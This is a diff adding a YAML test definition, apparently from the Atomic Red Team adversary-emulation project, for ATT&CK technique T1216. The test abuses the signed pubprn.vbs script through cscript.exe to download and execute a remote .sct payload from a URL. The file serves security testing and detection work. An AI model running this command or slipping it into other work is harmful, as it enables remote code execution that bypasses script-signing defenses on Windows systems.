@@ -1,0 +1,22 @@
+---
+attack_technique: T1216
+display_name: Signed Script Proxy Execution
+
+atomic_tests:
+- name: PubPrn.vbs Signed Script Bypass
+  description: |
+    Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    remote_payload:
+      description: A remote payload to execute using PubPrn.vbs.
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
+
+  executor:
+    name: command_prompt
+    command: |
+      cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
